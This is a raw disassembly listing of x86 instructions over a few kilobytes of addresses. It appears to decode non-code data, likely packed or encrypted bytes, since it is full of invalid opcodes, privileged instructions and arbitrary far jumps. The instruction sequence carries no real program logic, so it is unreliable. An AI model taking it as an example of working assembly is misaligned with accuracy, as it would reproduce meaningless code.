  415048:	pop    edx
  415049:	das    
  41504a:	jno    0x4150a7
  41504c:	mul    DWORD PTR [edx]
  41504e:	xchg   ecx,eax
  41504f:	(bad)  
  415050:	int    0x38
  415052:	mov    eax,ds:0xd8a256ee
  415057:	sbb    WORD PTR [ebp-0x1c],si
  41505b:	or     ch,bh
  41505d:	aad    0xc4
  41505f:	mov    edi,0x79a44612
  415064:	xor    ecx,ecx
  415066:	aad    0x96
  415068:	mov    ds:0xf4d44b25,al
  41506d:	xor    al,0x38
  41506f:	into   
  415070:	iret   
  415071:	ror    DWORD PTR [edi-0x58],0xf5
  415075:	jo     0x41505c
  415077:	aas    
  415078:	dec    ecx
  415079:	jnp    0x415066
  41507b:	outs   dx,DWORD PTR ds:[esi]
  41507c:	ror    BYTE PTR [eax],cl
  41507e:	xor    al,0xae
  415080:	xor    edx,ebp
  415082:	fs sbb al,0x64
  415085:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415086:	xchg   ebx,eax
  415087:	stc    
  415088:	adc    BYTE PTR [ebp-0x58],cl
  41508b:	add    DWORD PTR ds:[ebp+0x96816],eax
	...
  4150f2:	add    BYTE PTR [eax],al
  4150f4:	jnp    0x4150f8
  4150f6:	add    ebp,ebx
  4150f8:	jnp    0x4150e5
  4150fa:	sti    
  4150fb:	xchg   edx,eax
  4150fc:	lahf   
  4150fd:	mov    esi,0x3ca8fc2d
  415102:	loope  0x415170
  415104:	sbb    dh,bl
  415106:	add    BYTE PTR [eax],al
  415108:	add    eax,0xe7000001
  41510d:	call   0x1535cd6e
  415112:	add    BYTE PTR [ebp-0x58],dl
  415115:	es ret 0x1258
  415119:	pop    ebx
  41511a:	in     eax,0xce
  41511c:	cdq    
  41511d:	retf   
  41511e:	call   0xc521:0x516bcfaa
  415125:	gs cwde 
  415127:	iret   
  415128:	fucom  st(1)
  41512b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41512c:	pop    ebp
  41512d:	or     eax,0xf4c353e9
  415132:	gs aas 
  415134:	mov    ah,0x82
  415136:	push   edi
  415137:	adc    DWORD PTR [ebx+0x9],eax
  41513a:	scas   al,BYTE PTR es:[edi]
  41513b:	mov    cl,0xf
  41513d:	push   ds
  41513e:	pusha  
  41513f:	retf   
  415140:	mov    esi,0x1371c013
  415145:	dec    eax
  415146:	std    
  415147:	cs jg  0x415141
  41514a:	test   al,0x24
  41514c:	ins    DWORD PTR es:[edi],dx
  41514d:	(bad)  
  41514e:	xchg   DWORD PTR ds:0x5f7b6070,ecx
  415154:	ret    0x7c84
  415157:	test   edx,0x5ca504ff
  41515d:	repnz fwait
  41515f:	fs mov ah,0xec
  415162:	xchg   ebp,eax
  415163:	stc    
  415164:	sub    BYTE PTR [ebx+0x57],dh
  415167:	and    DWORD PTR [esi],edi
  415169:	mov    dl,0x41
  41516b:	or     BYTE PTR [edx+ebp*8+0x61],ch
  41516f:	retf   0x955b
  415172:	clc    
  415173:	rcr    edx,1
  415175:	push   esp
  415176:	jp     0x41512e
  415178:	mov    bh,0xfe
  41517a:	jle    0xfa2fc4e0
  415180:	out    dx,eax
  415181:	icebp  
  415182:	mov    ah,0x68
  415184:	int3   
  415185:	popa   
  415186:	div    DWORD PTR [edx+ebp*4]
  415189:	jp     0x41519b
  41518b:	jbe    0x415132
  41518d:	loope  0x41512d
  41518f:	inc    ebp
  415190:	in     al,0xff
  415192:	mov    cl,0xb7
  415194:	clc    
  415195:	rcr    BYTE PTR [eax+0x771d3b1d],cl
  41519b:	das    
  41519c:	stc    
  41519d:	nop
  41519e:	shr    BYTE PTR [edi-0x1b],0x61
  4151a2:	loopne 0x4151da
  4151a4:	adc    bh,dl
  4151a6:	fnstsw WORD PTR [edx-0x404d4a2]
  4151ac:	in     al,dx
  4151ad:	lods   eax,DWORD PTR ds:[esi]
  4151ae:	sbb    al,0x9c
  4151b0:	das    
  4151b1:	adc    DWORD PTR [ecx+0x6af03f55],eax
  4151b7:	push   DWORD PTR [eax-0x55]
  4151ba:	adc    dh,BYTE PTR [edx+0x65bac65e]
  4151c0:	and    al,0x87
  4151c2:	shr    DWORD PTR [ebp-0x30a3a1ee],1
  4151c8:	test   eax,0x9a76c3d7
  4151cd:	pop    ss
  4151ce:	jecxz  0x41519a
  4151d0:	xchg   edi,eax
  4151d1:	es push ecx
  4151d3:	pop    ebx
  4151d4:	jmp    0x11c:0xcc7c6aea
  4151db:	sbb    BYTE PTR [edi+0x6f],bl
  4151de:	dec    ecx
  4151df:	arpl   dx,sp
  4151e1:	push   ebx
  4151e2:	cmp    al,0xf5
  4151e4:	dec    ebx
  4151e5:	inc    eax
  4151e6:	jb     0x41518d
  4151e8:	das    
  4151e9:	jae    0x41523f
  4151eb:	inc    ebp
  4151ec:	aaa    
  4151ed:	(bad)  
  4151ee:	repnz daa 
  4151f0:	jle    0x415245
  4151f2:	int3   
  4151f3:	mov    bh,0xa3
  4151f6:	xchg   DWORD PTR [ecx+eiz*8-0x3c162e7d],esi
  4151fd:	and    ebx,ebx
  4151ff:	call   DWORD PTR [esi]
  415201:	jl     0x415191
  415203:	or     BYTE PTR [ebx+esi*4],cl
  415206:	shl    DWORD PTR ds:0xaf27137b,cl
  41520c:	push   ebx
  41520d:	sbb    BYTE PTR [edx+esi*2+0x73],cl
	...
  415274:	sub    al,0x97
  415276:	pop    ds
  415277:	sar    DWORD PTR [edi-0x6001127],1
  41527d:	(bad)  
  41527e:	mov    ecx,0x8607d00b
  415283:	pop    ds
  415284:	sbb    eax,0x50000df
  415289:	add    DWORD PTR [eax],eax
  41528b:	add    BYTE PTR [ebp-0x3df46187],dh
  415291:	shl    ch,1
  415293:	dec    esi
  415294:	icebp  
  415295:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415296:	gs dec ebp
  415298:	jecxz  0x4152c3
  41529a:	popf   
  41529b:	or     al,0xe1
  41529d:	sub    eax,0xfec251de
  4152a2:	(bad)  
  4152a3:	out    0x5a,eax
  4152a5:	stos   BYTE PTR es:[edi],al
  4152a6:	add    al,0x2d
  4152a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4152a9:	and    DWORD PTR ds:0x3dc5ac0a,edi
  4152af:	pop    eax
  4152b0:	(bad)  
  4152b1:	jp     0x4152d0
  4152b3:	(bad)  
  4152b4:	pop    ss
  4152b5:	lds    eax,FWORD PTR [esi+0x71]
  4152b8:	jo     0x4152de
  4152ba:	mov    eax,0xe243209
  4152bf:	xlat   BYTE PTR ds:[ebx]
  4152c0:	enter  0x6767,0x5d
  4152c4:	inc    esi
  4152c5:	out    0x3e,eax
  4152c7:	in     al,0xae
  4152c9:	ins    DWORD PTR es:[edi],dx
  4152ca:	xchg   dh,dl
  4152cc:	cmc    
  4152cd:	out    dx,al
  4152ce:	test   BYTE PTR [edx+0x2184705a],bh
  4152d4:	hlt    
  4152d5:	ret    0xf42f
  4152d8:	je     0x4152ff
  4152da:	cli    
  4152db:	mov    eax,ds:0xd439f5f1
  4152e0:	fwait
  4152e1:	cmp    eax,0x2df9669b
  4152e6:	or     ebx,esp
  4152e8:	int    0xfe
  4152ea:	adc    BYTE PTR [eax-0xa838806],ah
  4152f0:	stc    
  4152f1:	imul   esp,DWORD PTR [ecx+ecx*8+0x420d8042],0x49350762
  4152fc:	push   esp
  4152fd:	add    ebx,DWORD PTR [edx+esi*4]
  415300:	test   DWORD PTR [esi+edx*4],edi
  415303:	mul    eax
  415305:	mov    esi,0x1b117511
  41530a:	cmp    BYTE PTR [ecx+0x46],ah
  41530d:	xchg   DWORD PTR [eax-0x5e],ebp
  415310:	xchg   ebp,eax
  415311:	(bad)
  415314:	mov    DWORD PTR [eax+eax*1],0xc4a4330e
  41531b:	icebp  
  41531c:	push   ss
  41531d:	mov    dh,0x59
  41531f:	int    0x8b
  415321:	pop    ecx
  415322:	fs push ds
  415324:	call   0x4a8c:0x8903dc9c
  41532b:	mov    DWORD PTR [eax-0x1ebe3bf8],ebp
  415331:	int3   
  415332:	jmp    0x42ed:0x396682c9
  415339:	nop
  41533a:	stos   DWORD PTR es:[edi],eax
  41533b:	pop    eax
  41533c:	push   ebp
  41533d:	mov    esi,0xa0d7c39a
  415342:	stos   BYTE PTR es:[edi],al
  415343:	or     esp,edi
  415345:	lods   al,BYTE PTR ds:[esi]
  415346:	sbb    eax,0x6c80ed08
  41534b:	pusha  
  41534c:	mov    ?,ebx
  41534e:	push   DWORD PTR [edi]
  415350:	cmc    
  415351:	pop    edi
  415352:	and    eax,DWORD PTR cs:[ecx]
  415355:	inc    edx
  415356:	scas   al,BYTE PTR es:[edi]
  415357:	sbb    al,cl
  415359:	(bad)  
  41535d:	daa    
  41535e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41535f:	test   al,0x54
  415361:	mov    ebx,0x317e225c
  415366:	mov    ch,0x79
  415368:	(bad)  
  415369:	std    
  41536a:	cmp    eax,0xfff9981d
  41536f:	xchg   BYTE PTR [edi+0x4bcef018],ch
  415375:	(bad)  
  415376:	lea    edi,[eax+0xc]
  415379:	inc    eax
  41537a:	jae    0x4153ec
  41537c:	out    dx,al
  41537d:	add    dh,BYTE PTR [edi+0x46ca5984]
  415383:	retf   0x55cd
  415386:	imul   esi,DWORD PTR [eax+0x527c84ad],0x6d
  41538d:	fwait
  41538e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41538f:	mov    ch,0xb9
	...
  4153f1:	add    BYTE PTR [eax],al
  4153f3:	add    BYTE PTR [ebp-0x10],ch
  4153f6:	repz jmp FWORD PTR cs:[edi]
  4153fa:	std    
  4153fb:	repz mov edi,0xd8d3e5b0
  415401:	mov    edx,0xe022c62c
  415406:	add    BYTE PTR [eax],al
  415408:	add    eax,0xd6000001
  41540d:	inc    ebx
  41540e:	adc    DWORD PTR [ebp+0x60544047],0xfffffffc
  415415:	pop    ds
  415416:	retf   0x6a89
  415419:	dec    ebx
  41541a:	nop
  41541b:	push   ebp
  41541c:	enter  0x54f5,0x4
  415420:	(bad)  
  415422:	cmp    DWORD PTR gs:[ebx+0x39507282],esi
  415429:	es xchg edx,eax
  41542b:	xchg   ecx,eax
  41542c:	cmp    BYTE PTR [esi+ebx*2-0x229088f6],ch
  415433:	jb     0x41546e
  415435:	adc    cl,cl
  415437:	popa   
  415438:	jle    0x415498
  41543a:	ds in  eax,0x2d
  41543d:	inc    ebp
  41543e:	pop    esp
  41543f:	xchg   DWORD PTR ds:0x15e5705,eax
  415445:	call   0x8394:0xd4e451c
  41544c:	test   eax,0x41cf8da5
  415451:	or     ah,ah
  415453:	and    DWORD PTR [ecx],ecx
  415455:	mov    ch,0x85
  415457:	jnp    0x415498
  415459:	xor    al,BYTE PTR [ebp-0x8207b04]
  41545f:	in     eax,0x51
  415461:	fisubr DWORD PTR [edx-0x4686dbf]
  415467:	xchg   DWORD PTR [esi+0x7087438d],edx
  41546d:	test   DWORD PTR ds:0xcf4819f4,edx
  415473:	ins    DWORD PTR es:[edi],dx
  415474:	pop    ebx
  415475:	cmp    eax,0x4168b1d0
  41547a:	pop    ecx
  41547b:	in     eax,0xcb
  41547d:	pop    esi
  41547e:	icebp  
  41547f:	fimul  DWORD PTR [esi-0x6d]
  415482:	dec    ebp
  415483:	popa   
  415484:	sar    DWORD PTR [edi+0x34d2e8d4],cl
  41548a:	mov    dl,0x5
  41548c:	dec    ebp
  41548d:	jg     0x4154da
  41548f:	fmul   DWORD PTR [edx+0x52]
  415492:	or     dl,BYTE PTR [edx+ebx*1+0x211cdafb]
  415499:	test   BYTE PTR [ebx+0x30],0x70
  41549d:	retf   0xe49e
  4154a0:	(bad)  
  4154a1:	das    
  4154a2:	popf   
  4154a3:	xor    al,0xa3
  4154a5:	cmc    
  4154a6:	outs   dx,BYTE PTR ds:[esi]
  4154a7:	mov    ebx,0x25eb5a3b
  4154ac:	adc    eax,0xc941247b
  4154b1:	mov    eax,ds:0x8145649
  4154b6:	inc    edi
  4154b7:	les    ebp,FWORD PTR [esp+edx*4-0x4b]
  4154bb:	in     eax,0xfb
  4154bd:	retf   
  4154be:	add    esp,DWORD PTR [ebx+0x125893a3]
  4154c4:	ds pop ebp
  4154c6:	inc    esi
  4154c7:	ds pop ecx
  4154c9:	and    al,BYTE PTR [bx+di+0x3319]
  4154ce:	or     dl,BYTE PTR [edx+eax*4+0x2676169a]
  4154d5:	push   ds
  4154d6:	jge    0x4154fd
  4154d8:	fidiv  DWORD PTR [ebx]
  4154da:	ins    DWORD PTR es:[edi],dx
  4154db:	cwde   
  4154dc:	fsubr  DWORD PTR [edx-0x238aaf39]
  4154e2:	mov    cl,0xfe
  4154e4:	lahf   
  4154e5:	mov    ch,0xb4
  4154e7:	ret    
  4154e8:	or     edi,DWORD PTR [ebx+ebx*8+0x4d]
  4154ec:	cmp    eax,0xbb1789d4
  4154f1:	lds    ebp,FWORD PTR [esi+0x2dd62de3]
  4154f7:	xor    eax,0x707b0bfe
  4154fc:	mov    edx,esp
  4154fe:	mov    dl,0x3b
  415500:	retf   0x3217
  415503:	ror    BYTE PTR [esi+0x22],1
  415506:	pop    esi
  415507:	(bad)
  41550b:	mov    edi,0xa3799075
  415510:	sahf   
	...
  415571:	add    BYTE PTR [eax],al
  415573:	add    ah,ah
  415575:	lock sub DWORD PTR [edx],ecx
  415578:	cmp    eax,0xa2fee7db
  41557d:	arpl   WORD PTR [ebx],bp
  41557f:	je     0x4155ed
  415581:	lock in eax,0xd7
  415584:	daa    
  415585:	loope  0x415587
  415587:	add    BYTE PTR ds:0xb5000001,al
  41558d:	pop    ds
  41558e:	mov    esp,0x35295b84
  415593:	std    
  415594:	xchg   edx,eax
  415595:	pusha  
  415596:	stc    
  415597:	jle    0x415606
  415599:	push   0x69
  41559b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41559c:	popf   
  41559d:	sub    bl,BYTE PTR [eax]
  41559f:	mov    WORD PTR [edx+0x39694684],?
  4155a5:	je     0x41560e
  4155a7:	jle    0x4155a0
  4155a9:	add    eax,0x218a4dc6
  4155af:	out    dx,al
  4155b0:	pop    ebp
  4155b1:	sbb    al,BYTE PTR [edi+edx*4+0x65]
  4155b5:	sub    bh,bh
  4155b7:	add    edx,ebx
  4155b9:	push   ebp
  4155ba:	xchg   ecx,eax
  4155bb:	push   eax
  4155bc:	pop    ds
  4155bd:	xchg   ebp,eax
  4155be:	xor    DWORD PTR [ebx],0xffffffc6
  4155c1:	mov    edi,0x52888e5c
  4155c6:	sub    eax,ecx
  4155c8:	hlt    
  4155c9:	cwde   
  4155ca:	jmp    DWORD PTR [ebx-0x6]
  4155cd:	(bad)  
  4155ce:	xchg   ebx,eax
  4155cf:	mov    DWORD PTR [ebx+0x44],esi
  4155d2:	(bad)  
  4155d3:	xor    eax,0x3585dab8
  4155d8:	mov    dh,0x71
  4155da:	mov    dl,0x5b
  4155dc:	bound  eax,QWORD PTR [ebx+0x42d282f0]
  4155e2:	add    DWORD PTR [edx+eax*2-0x4ab69be8],esi
  4155e9:	push   ds
  4155ea:	js     0x41564e
  4155ec:	mov    eax,esi
  4155ee:	mov    dh,0x2e
  4155f0:	jle    0x4155ff
  4155f2:	int3   
  4155f3:	leave  
  4155f4:	sbb    eax,0x360d01a7
  4155f9:	aam    0xcc
  4155fb:	pop    DWORD PTR [edx+0xe]
  4155fe:	push   eax
  4155ff:	std    
  415600:	fisttp DWORD PTR [ebx]
  415602:	jae    0x41566b
  415604:	push   0x974a49e1
  415609:	mul    DWORD PTR [ebx]
  41560b:	sti    
  41560c:	fstp   st(7)
  41560e:	sbb    dl,BYTE PTR [esi-0x74d0734e]
  415614:	bound  ebx,QWORD PTR [ebp+0x37]
  415617:	cmp    al,bh
  415619:	ds xor eax,0xb68a0355
  41561f:	mov    eax,0x85765853
  415624:	int    0x7c
  415626:	rcr    DWORD PTR [esi-0x2ad471b1],cl
  41562c:	mov    ecx,DWORD PTR [eax]
  41562e:	mov    ebx,0x55164e6
  415633:	rcr    DWORD PTR [esi+0x554ade49],1
  415639:	mov    ah,0xc1
  41563b:	arpl   WORD PTR [esi-0x16e90e20],ax
  415641:	or     eax,0x7d040ff2
  415646:	mov    al,BYTE PTR [edi-0x11]
  415649:	jae    0x41567e
  41564b:	test   eax,0x383435e8
  415650:	xor    dl,dl
  415652:	push   esi
  415653:	dec    edx
  415654:	loopne 0x41562b
  415656:	call   0xe2a3a795
  41565b:	shl    DWORD PTR [ebx],cl
  41565d:	and    eax,0x61e686bf
  415662:	fisttp QWORD PTR [edi+0x1edd0a2d]
  415668:	sahf   
  415669:	(bad)  
  41566a:	pop    ss
  41566b:	or     al,0x1a
  41566d:	dec    edx
  41566e:	daa    
  41566f:	in     eax,0xd0
  415671:	stos   BYTE PTR es:[edi],al
  415672:	mov    bh,dh
  415674:	hlt    
  415675:	test   eax,0x5efcf147
  41567a:	mov    cl,0x0
  41567c:	jmp    0xc9cb2b5d
  415681:	je     0x4156dd
  415683:	nop
  415684:	jecxz  0x415695
  415686:	jae    0x4156ea
  415688:	loope  0x415640
  41568a:	mul    BYTE PTR [ebx-0x67]
  41568d:	jnp    0x4156e7
  41568f:	jne    0x415619
	...
  4156f1:	add    BYTE PTR [eax],al
  4156f3:	add    BYTE PTR [ebp-0x66],ch
  4156f6:	mov    esp,0xfd67ff45
  4156fb:	mov    edx,0x2c46bab3
  415700:	sbb    BYTE PTR [eax],0x13
  415703:	dec    esp
  415704:	sub    al,0xe2
  415706:	add    BYTE PTR [eax],al
  415708:	add    eax,0x4b000001
  41570d:	push   0x81cebea0
  415712:	fimul  WORD PTR [ebp+0x75]
  415715:	fadd   DWORD PTR [edi-0x796a1f7b]
  41571b:	out    dx,eax
  41571c:	pop    ebp
  41571d:	lods   al,BYTE PTR ds:[esi]
  41571e:	fs jo  0x4156bc
  415721:	pushf  
  415722:	push   ds
  415723:	push   ebx
  415724:	mov    ebx,0x5233eb6b
  415729:	ret    
  41572a:	cmp    al,0xbe
  41572c:	pop    es
  41572d:	test   eax,0x99c4ac0
  415732:	cmp    bl,BYTE PTR [ecx-0x211de0ab]
  415738:	push   ecx
  415739:	cmp    BYTE PTR [ecx+0x1],bl
  41573c:	lods   eax,DWORD PTR ds:[esi]
  41573d:	sub    DWORD PTR [eax],0xa6a49d71
  415743:	ror    DWORD PTR [edx],cl
  415745:	loope  0x41578b
  415747:	push   ebx
  415748:	test   al,0x5
  41574a:	sub    eax,0x6a74a89e
  41574f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415750:	jae    0x41572d
  415752:	icebp  
  415753:	jo     0x415762
  415755:	or     cl,cl
  415757:	popa   
  415758:	in     eax,dx
  415759:	in     al,dx
  41575a:	inc    esi
  41575b:	jp     0x41578c
  41575d:	in     eax,0x3c
  41575f:	ss retf 
  415761:	adc    al,0x26
  415763:	or     ecx,ebx
  415765:	push   es
  415766:	sub    al,BYTE PTR [edi+0x6f924334]
  41576c:	retf   0xb116
  41576f:	je     0x415783
  415771:	adc    DWORD PTR [ecx+edx*4-0x61],edx
  415775:	fld    QWORD PTR [esi-0x6d]
  415778:	adc    DWORD PTR [eax-0x36198b61],ebp
  41577e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41577f:	push   eax
  415780:	js     0x41576e
  415782:	xor    BYTE PTR [eax-0x44],ch
  415785:	retf   0x86c5
  415788:	add    DWORD PTR [esi+0x10c3cff0],edi
  41578e:	test   BYTE PTR [edi],bh
  415790:	outs   dx,DWORD PTR ds:[esi]
  415791:	call   0xf0af8cea
  415796:	inc    edi
  415797:	pop    eax
  415798:	or     DWORD PTR [edi+0x44],edx
  41579b:	adc    cl,BYTE PTR [ebx]
  41579d:	rcr    DWORD PTR [eax+0xd],cl
  4157a0:	mov    bh,0x7a
  4157a2:	(bad)  
  4157a3:	retf   0xd59c
  4157a6:	cmp    ebp,edi
  4157a8:	arpl   WORD PTR [edi],dx
  4157aa:	pop    ecx
  4157ab:	adc    esi,DWORD PTR [edx-0x655f58d1]
  4157b1:	push   ecx
  4157b2:	imul   esi,DWORD PTR [edi],0x47da4983
  4157b8:	jae    0x41580f
  4157ba:	retf   
  4157bb:	lods   eax,DWORD PTR ds:[esi]
  4157bc:	pop    esp
  4157bd:	nop    DWORD PTR [ebp-0x45657ff]
  4157c4:	jl     0x4157f4
  4157c6:	inc    edx
  4157c7:	pop    edi
  4157c8:	jne    0x415804
  4157ca:	mov    edi,0x8dda0fa8
  4157cf:	push   es
  4157d0:	mov    BYTE PTR [edx+0x1dfd5538],bh
  4157d6:	lock or BYTE PTR fs:[edi],dh
  4157da:	xchg   BYTE PTR [edi+0x43ee1e75],dh
  4157e0:	test   al,0x46
  4157e2:	sbb    eax,0x54cf367f
  4157e7:	mov    ds:0x9d550906,al
  4157ec:	mov    esi,0xa300f215
  4157f1:	test   eax,0x42df400a
  4157f6:	and    edi,DWORD PTR [edx-0x2e5b2403]
  4157fc:	scas   eax,DWORD PTR es:[edi]
  4157fd:	pushf  
  4157fe:	pop    ecx
  4157ff:	jno    0x415841
  415801:	adc    DWORD PTR [edx-0x227ecfa8],eax
  415807:	push   ss
  415808:	xor    eax,0x6efde8f8
  41580d:	fcom   DWORD PTR [edx+0x35a5]
	...
  415873:	add    bl,cl
  415875:	(bad)  
  415876:	xchg   ebx,eax
  415877:	in     al,dx
  415878:	mov    bh,0xed
  41587a:	(bad)  
  41587b:	inc    DWORD PTR [edi]
  41587d:	(bad)  
  41587f:	rcr    DWORD PTR [edi+0x312c6eaa],cl
  415885:	jecxz  0x415887
  415887:	add    BYTE PTR ds:0xbc000001,al
  41588d:	add    al,0xd
  41588f:	sbb    ebp,ebx
  415891:	or     esi,DWORD PTR [ebp+0x2f90c546]
  415897:	mov    dh,0xbe
  415899:	ins    DWORD PTR es:[edi],dx
  41589a:	pop    es
  41589b:	rol    DWORD PTR [esi],0x4a
  41589e:	(bad)  
  41589f:	mov    ds:0x22cf6ada,eax
  4158a4:	gs xchg edi,eax
  4158a6:	xor    ecx,DWORD PTR [ecx]
  4158a8:	sbb    bh,BYTE PTR fs:[ecx+ebx*4-0x4c1a1c01]
  4158b0:	xchg   edx,eax
  4158b1:	test   DWORD PTR [edi],ebx
  4158b3:	push   0x71340698
  4158b8:	mov    edi,0xb1a124ef
  4158bd:	(bad)  
  4158be:	jge    0x4158c6
  4158c0:	sbb    dh,ch
  4158c2:	gs push edx
  4158c4:	or     eax,DWORD PTR [ebp+0x3c]
  4158c7:	mov    al,0x73
  4158c9:	sbb    DWORD PTR [edi],eax
  4158cb:	sahf   
  4158cc:	add    ecx,edi
  4158ce:	dec    edx
  4158cf:	clc    
  4158d0:	addr16 mov dh,cl
  4158d3:	in     al,0x78
  4158d5:	das    
  4158d6:	dec    ecx
  4158d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4158d8:	mov    bl,0xee
  4158da:	sbb    BYTE PTR [edx-0x80],dh
  4158dd:	xor    eax,0x81ffdafc
  4158e2:	pop    esp
  4158e3:	adc    esp,esi
  4158e5:	jle    0x4158e1
  4158e7:	adc    bh,BYTE PTR [edx]
  4158e9:	mov    al,BYTE PTR [ebp+0x295b9ba5]
  4158ef:	jecxz  0x4158e1
  4158f1:	sahf   
  4158f2:	sbb    dl,al
  4158f4:	cli    
  4158f5:	imul   edi,edi,0xb84f8cf9
  4158fb:	push   ecx
  4158fc:	aaa    
  4158fd:	lahf   
  4158fe:	or     BYTE PTR [edi-0x51],al
  415901:	mov    al,ds:0x9489d6ee
  415906:	xor    esp,DWORD PTR [edi]
  415908:	push   0x5a
  41590a:	leave  
  41590b:	dec    ecx
  41590c:	mov    ds:0xdeea86c6,al
  415911:	xlat   BYTE PTR ds:[ebx]
  415912:	vmread DWORD PTR [ebx+ecx*8],edx
  415916:	call   0x9b8df52c
  41591b:	dec    esp
  41591c:	fbld   TBYTE PTR ds:0xf3587994
  415922:	sbb    DWORD PTR [esi],edx
  415924:	leave  
  415925:	sub    DWORD PTR [edi],ecx
  415927:	das    
  415928:	mov    eax,ds:0x8828d9d1
  41592d:	das    
  41592e:	aas    
  41592f:	xor    DWORD PTR [esi+0x3e],eax
  415932:	hlt    
  415933:	xchg   edi,eax
  415934:	iret   
  415935:	fmul   DWORD PTR [ebx-0x6f]
  415938:	inc    esp
  415939:	in     eax,0x9d
  41593b:	sub    eax,0x79fea288
  415940:	data16 aaa 
  415942:	retf   
  415943:	pop    ebx
  415944:	push   esi
  415945:	fstp   DWORD PTR gs:[ebx]
  415948:	dec    edi
  415949:	int3   
  41594a:	arpl   WORD PTR [edx+0xf],bp
  41594d:	pop    ecx
  41594e:	or     BYTE PTR [edx],dh
  415950:	xor    al,0xc5
  415952:	ret    0x14a8
  415955:	push   ds
  415956:	push   ss
  415957:	and    ebp,DWORD PTR [edi+ecx*1]
  41595a:	inc    edx
  41595b:	aam    0x7a
  41595d:	idiv   DWORD PTR [edi]
  41595f:	ds int3 
  415961:	adc    bl,dl
  415963:	repnz and edx,DWORD PTR cs:[edx]
  415967:	mov    dl,0x24
  415969:	cli    
  41596a:	push   cs
  41596b:	retf   0xbe78
  41596e:	cmp    BYTE PTR [edx+0x50],ah
  415971:	push   ss
  415972:	icebp  
  415973:	or     DWORD PTR ss:[ecx-0x58c814ea],0xffffffc3
  41597b:	stc    
  41597c:	enter  0xe269,0xa8
  415980:	je     0x415997
  415982:	and    eax,0xad741bec
  415987:	stos   DWORD PTR es:[edi],eax
  415988:	mov    esp,0x251ea483
  41598d:	and    al,0x10
  41598f:	mov    bh,0xae
	...
  4159f1:	add    BYTE PTR [eax],al
  4159f3:	add    BYTE PTR [ebp-0x78],al
  4159f6:	sub    al,0x77
  4159f8:	in     eax,dx
  4159f9:	neg    DWORD PTR [edi-0x46]
  4159fc:	sub    edi,DWORD PTR [edi-0x10]
  4159ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a00:	pop    ebp
  415a01:	sub    eax,0xe436f0ab
  415a06:	add    BYTE PTR [eax],al
  415a08:	add    eax,0x92000001
  415a0d:	jnp    0x415a62
  415a0f:	test   al,0x2b
  415a11:	cs push edi
  415a13:	clc    
  415a14:	lea    ebp,[eax-0x22]
  415a17:	pop    es
  415a18:	cdq    
  415a19:	(bad)  
  415a1a:	mov    edx,0x4421815f
  415a1f:	cmp    eax,0xfb1723a0
  415a24:	mov    edx,0xda4d9144
  415a29:	mov    ds:0xb9398453,al
  415a2e:	and    al,0x46
  415a30:	mov    ecx,0x38f4d3fc
  415a35:	xlat   BYTE PTR ds:[ebx]
  415a36:	mov    eax,0x881ff86d
  415a3b:	out    dx,eax
  415a3c:	jge    0x415a18
  415a3e:	rol    BYTE PTR [edi-0x37e0aa3b],0x55
  415a45:	sub    al,0xe5
  415a47:	aaa    
  415a48:	scas   eax,DWORD PTR es:[edi]
  415a49:	in     eax,0xdd
  415a4b:	std    
  415a4c:	lds    ecx,FWORD PTR es:[ebp+eiz*4-0x56716f94]
  415a54:	in     al,0xa0
  415a56:	xor    BYTE PTR [edi],al
  415a58:	dec    ecx
  415a59:	dec    eax
  415a5a:	cmp    eax,0xd155fd6e
  415a5f:	call   DWORD PTR [edx+0x686f8bbd]
  415a65:	sub    al,0x13
  415a67:	(bad)  
  415a68:	pop    esp
  415a69:	push   cs
  415a6a:	xchg   DWORD PTR [eax],ebx
  415a6c:	lock and edx,ecx
  415a6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415a70:	int3   
  415a71:	pop    ebp
  415a72:	cli    
  415a73:	lds    esi,FWORD PTR [edi+0x44]
  415a76:	cmp    BYTE PTR [edi+0xe],0xd0
  415a7a:	mov    dh,BYTE PTR [edi+0xd]
  415a7d:	xlat   BYTE PTR ds:[ebx]
  415a7e:	int    0xa3
  415a80:	add    dh,al
  415a82:	jg     0x415b01
  415a84:	int    0x26
  415a86:	stos   BYTE PTR es:[edi],al
  415a87:	jne    0x415af8
  415a89:	test   DWORD PTR [edi-0x64613417],ebp
  415a8f:	mov    bl,ch
  415a91:	add    BYTE PTR [ecx],dh
  415a93:	mov    dl,0x3f
  415a95:	mov    edx,0x4d3515af
  415a9a:	mov    ecx,0x5324c5a3
  415a9f:	xchg   edx,eax
  415aa0:	inc    edx
  415aa1:	mov    edx,0x3771c645
  415aa6:	mov    edx,0xb7f9df11
  415aab:	aam    0x20
  415aad:	imul   esp,DWORD PTR [edi+ebp*4],0x6b
  415ab1:	fidiv  WORD PTR [ebp+0x74de5de8]
  415ab7:	mov    edi,0x62dcbd22
  415abc:	lahf   
  415abd:	mov    edx,0xa3bae025
  415ac2:	js     0x415a90
  415ac4:	test   eax,0xedcb2b54
  415ac9:	shr    ebx,cl
  415acb:	test   al,0xd3
  415acd:	adc    al,0xad
  415acf:	inc    esi
  415ad0:	dec    esi
  415ad1:	push   ds
  415ad2:	imul   DWORD PTR [ebp+0x2e8ccf5c]
  415ad8:	jge    0x415ad3
  415ada:	mov    ah,0x30
  415adc:	and    DWORD PTR [ebx-0x2e],esi
  415adf:	push   ecx
  415ae0:	in     eax,0xe8
  415ae2:	mov    edx,0x3c868764
  415ae7:	and    ch,BYTE PTR [edi-0x516c3f44]
  415aed:	push   ecx
  415aee:	aad    0xb9
  415af0:	mov    cl,0xa6
  415af2:	xor    eax,0x7197f0a7
  415af7:	adc    BYTE PTR [esi],cl
  415af9:	adc    ah,ch
  415afb:	jae    0x415a9c
  415afd:	xchg   edx,eax
  415afe:	(bad)  
  415aff:	or     al,0xd1
  415b01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415b02:	(bad)
  415b05:	add    BYTE PTR [esi+edx*2+0x37],bl
  415b09:	pop    ds
